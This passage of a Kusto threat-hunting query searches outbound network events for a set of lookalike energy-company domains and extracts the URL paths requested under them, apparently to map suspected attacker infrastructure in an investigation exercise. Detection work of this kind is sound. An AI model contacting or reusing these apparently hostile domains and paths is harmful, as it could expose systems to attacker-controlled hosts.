  "renewablesolutionsenergycorp.com",
  "renewablesolutions-energycorp.com",
  "griddefender-powergrid.com",
  "energycorp-griddefender.com"
];
OutboundNetworkEvents
  | where url has_any (domains)
  | parse url with "https://renewablesolutionsgriddefender.com/modules/" extracted_path
  | parse url with "https://renewablesolutions-powergrid.com/share/public/" extracted_path1
  | parse url with "https://griddefenderpowergrid.com/modules/" extracted_path2
 | parse url with "http://renewablesolutionspowergrid.com/share/public/" extracted_path3
  | parse url with "http://renewablesolutionsgriddefender.com/share/files/" extracted_path4
    | parse url with "http://renewablesolutionsgriddefender.com/images/search/public/" extracted_path5
    | parse url with "http://renewablesolutions-powergrid.com/share/published/" extracted_path6
    | parse url with "http://renewablesolutions-powergrid.com/public/" extracted_path7
    | parse url with "http://renewablesolutions-powergrid.com/files/files/" extracted_path8
    | parse url with "http://renewablesolutions-energycorp.com/published/search/share/" extracted_path9
    | parse url with "http://griddefenderpowergrid.com/published/share/" extracted_path10
  | extend result = coalesce(extracted_path, extracted_path1, extracted_path2, extracted_path3, extracted_path4, extracted_path5, extracted_path6, extracted_path7, extracted_path8, extracted_path9, extracted_path10)
  | distinct  result
